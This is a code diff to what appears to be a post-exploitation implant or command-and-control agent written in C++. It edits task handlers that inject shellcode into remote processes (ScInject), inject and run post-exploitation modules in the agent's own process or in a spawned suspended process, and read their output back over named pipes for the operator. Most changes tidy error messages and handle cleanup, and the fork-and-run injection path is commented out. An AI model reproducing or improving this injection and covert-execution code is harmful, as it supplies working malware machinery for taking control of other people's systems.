@@ -179,7 +179,7 @@ auto DECLFN Task::Upload(
                 }
             }
             if ( FileID ) {
-                CHAR* ErrorMsg = "[x] The maximum number of files you can upload at the same time is 5";
+                CHAR* ErrorMsg = "The maximum number of files you can upload at the same time is 5";
                 KhDbg( "%s", ErrorMsg );
                 Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
                 return KhRetSuccess;
@@ -219,7 +219,7 @@ auto DECLFN Task::Upload(
                 }
             }
             if ( Index == -1 ) {
-                CHAR* ErrorMsg = "[x] File ID not found";
+                CHAR* ErrorMsg = "File ID not found";
                 KhDbg( "%s", ErrorMsg );
                 Self->Pkg->SendMsg( Job->UUID, ErrorMsg, CALLBACK_ERROR );
                 return KhRetSuccess;
@@ -254,7 +254,7 @@ auto DECLFN Task::ScInject(
     Object->ProcessId = ProcessId;
 
     if ( ! Self->Inj->Standard( Buffer, Length, nullptr, 0, Job->UUID, Object ) ) {
-        Self->Pkg->SendMsg( Job->UUID, "[x] Failed to inject into remote process", CALLBACK_ERROR );
+        Self->Pkg->SendMsg( Job->UUID, "Failed to inject into remote process", CALLBACK_ERROR );
         return KhGetError;
     }
 
@@ -275,9 +275,9 @@ auto DECLFN Task::PostEx(
     HANDLE   BackupHandle = INVALID_HANDLE_VALUE;
     HANDLE   PipeHandle   = INVALID_HANDLE_VALUE;
 
-    INJ_OBJ* Object       = nullptr;
+    INJ_OBJ* Object = nullptr;
 
-    PROCESS_INFORMATION* PsInfo = nullptr;
+    PROCESS_INFORMATION PsInfo = { 0 };
 
     BYTE* Output = nullptr;
 
@@ -295,10 +295,10 @@ auto DECLFN Task::PostEx(
         if ( WritePipe    != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( WritePipe );
         if ( ReadPipe     != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ReadPipe );
         if ( BackupHandle != INVALID_HANDLE_VALUE ) Self->Krnl32.SetStdHandle( STD_OUTPUT_HANDLE, BackupHandle );
-        if ( PsInfo ) {
-            if ( PsInfo->hProcess ) Self->Ntdll.NtClose( PsInfo->hProcess );
-            if ( PsInfo->hThread  ) Self->Ntdll.NtClose( PsInfo->hThread  );
-            hFree( PsInfo );
+        if ( PsInfo.hProcess ) {
+            Self->Krnl32.TerminateProcess( PsInfo.hProcess, EXIT_SUCCESS );
+            if ( PsInfo.hProcess ) Self->Ntdll.NtClose( PsInfo.hProcess );
+            if ( PsInfo.hThread  ) Self->Ntdll.NtClose( PsInfo.hThread  );
         }
         if ( Object ) {
             if ( Object->BaseAddress  ) Self->Mm->Free( Object->BaseAddress, Length + ArgLen, MEM_RELEASE, Object->PsHandle );
@@ -318,7 +318,7 @@ auto DECLFN Task::PostEx(
         };
 
         if ( ! Self->Krnl32.CreatePipe( &ReadPipe, &WritePipe, &SecAttr, PIPE_BUFFER_LENGTH ) ) {
-            QuickErr( "[x] Failed to create pipe" );
+            QuickErr( "Failed to create pipe" );
             return CleanupAndReturn();
         }
 
@@ -329,7 +329,7 @@ auto DECLFN Task::PostEx(
         Object->Persist  = TRUE;
 
         if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
-            QuickErr( "[x] Failed to inject post-ex module");
+            QuickErr( "Failed to inject post-ex module");
             return CleanupAndReturn();
         }
 
@@ -348,50 +348,69 @@ auto DECLFN Task::PostEx(
                 }
             }
         }
-    } else if ( Method == Enm::PostXpl::Fork ) {
-        PsInfo = (PROCESS_INFORMATION*)hAlloc( sizeof( PROCESS_INFORMATION ) );
 
-        ULONG ForkState = Self->Psr->Int32( Parser );
-        ULONG ProcessId = Self->Psr->Int32( Parser );
+    // todo: make the fork and run option
 
-        if ( ! Self->Ps->Create( Self->Ps->Ctx.Spawnto, CREATE_SUSPENDED, PsInfo ) ) {
-            QuickErr( "[x] Failed in process creation" );
-            return CleanupAndReturn( KhGetError );
-        }
+    // } else if ( Method == Enm::PostXpl::Fork ) { 
+    //     Self->Ps->Ctx.Pipe = FALSE;
 
-        Object->Persist   = TRUE;
-        Object->ProcessId = PsInfo->dwProcessId;
-        Object->PsHandle  = PsInfo->hProcess;
+    //     if ( ! Self->Ps->Create( "C:\\Windows\\System32\\cmd.exe", TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, &PsInfo ) ) {
+    //         QuickErr( "Failed in process creation: %d", KhGetError );
+    //         return CleanupAndReturn( KhGetError );
+    //     }
 
-        if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
-            QuickErr( "[x] Injection failed in fork mode" );
-            return CleanupAndReturn( KhGetError );
-        }
+    //     Self->Krnl32.ResumeThread( PsInfo.hThread );
 
-        if ( ! Self->Krnl32.WaitNamedPipeA( Self->Ps->Ctx.ForkPipe, 2000 ) ) {
-            QuickErr("[x] Named pipe not available");
-            return CleanupAndReturn( KhGetError );
-        }
+    //     KhDbg( "postex module running at pid %d tid %d", PsInfo.dwProcessId, PsInfo.dwThreadId );
+    //     KhDbg( "postex module running at ph %d th %d", PsInfo.hProcess, PsInfo.hThread );
 
-        PipeHandle = Self->Krnl32.CreateFileA(
-            KH_FORK_PIPE_NAME, GENERIC_READ, 0,
-            nullptr, OPEN_EXISTING, 0, nullptr
-        );
-        if ( PipeHandle == INVALID_HANDLE_VALUE ) {
-            QuickErr( "[x] Failed to open named pipe" );
-            return CleanupAndReturn( KhGetError );
-        }
+    //     Self->Ps->Ctx.Pipe = TRUE;
 
-        ULONG BytesAvail = 0;
-        if ( Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
-            Output = (BYTE*)hAlloc( BytesAvail );
-            if ( Output ) {
-                ULONG BytesRead = 0;
-                if ( Self->Krnl32.ReadFile( PipeHandle, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
-                    QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
-                }
-            }
-        }
+    //     Object->Persist   = TRUE;
+    //     Object->ProcessId = PsInfo.dwProcessId;
+    //     Object->PsHandle  = PsInfo.hProcess;
+
+    //     if ( ! Self->Inj->Standard( Buffer, Length, ArgBuff, ArgLen, Job->UUID, Object ) ) {
+    //         QuickErr( "Injection failed in fork mode\n" );
+    //         return CleanupAndReturn( KhGetError );
+    //     }
+
+    //     for (int i = 0; i < 10; i++) {
+    //         if ( Self->Krnl32.WaitNamedPipeA( KH_FORK_PIPE_NAME, 5000 ) ) {
+    //             break;
+    //         }
+    //         if (i == 9) {
+    //             QuickErr("Pipe timeout\n");
+    //         }
+    //     }
+
+    //     for (int i = 0; i < 10; i++) {
+    //         PipeHandle = Self->Krnl32.CreateFileA(
+    //             KH_FORK_PIPE_NAME,GENERIC_READ,
+    //             0, NULL, OPEN_EXISTING, 0, NULL
+    //         );
+    //         if ( PipeHandle != INVALID_HANDLE_VALUE ) {
+    //             break;
+    //         }
+            
+    //         Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, 500 );
+            
+    //         if (i == 9) {
+    //             KhDbg("Failed to connect to named pipe");
+    //             return CleanupAndReturn(ERROR_TIMEOUT);
+    //         }
+    //     }
+
+    //     ULONG BytesAvail = 0;
+    //     if ( Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &BytesAvail, nullptr ) && BytesAvail > 0 ) {
+    //         Output = (BYTE*)hAlloc( BytesAvail );
+    //         if ( Output ) {
+    //             ULONG BytesRead = 0;
+    //             if ( Self->Krnl32.ReadFile( PipeHandle, Output, BytesAvail, &BytesRead, nullptr ) && BytesRead > 0 ) {
+    //                 QuickOut( Job->UUID, Job->CmdID, Output, BytesRead );
+    //             }
+    //         }
+    //     }
     }
 
     return CleanupAndReturn( ERROR_SUCCESS );
@@ -1437,7 +1456,7 @@ auto DECLFN Task::Process(
 
             KhDbg("start to run: %s", CommandLine);
 
-            Success = Self->Ps->Create( CommandLine, CREATE_NO_WINDOW, &PsInfo );
+            Success = Self->Ps->Create( CommandLine, TRUE, CREATE_NO_WINDOW, &PsInfo );
             if ( !Success ) return KhGetError;
 
             Self->Pkg->Int32( Package, PsInfo.dwProcessId );
@@ -1446,6 +1465,7 @@ auto DECLFN Task::Process(
             if ( Self->Ps->Out.p ) {
                 Self->Pkg->Bytes( Package, (UCHAR*)Self->Ps->Out.p, Self->Ps->Out.s );
                 hFree( Self->Ps->Out.p );
+                Self->Ps->Out.p = nullptr;
             } 
             
             break;
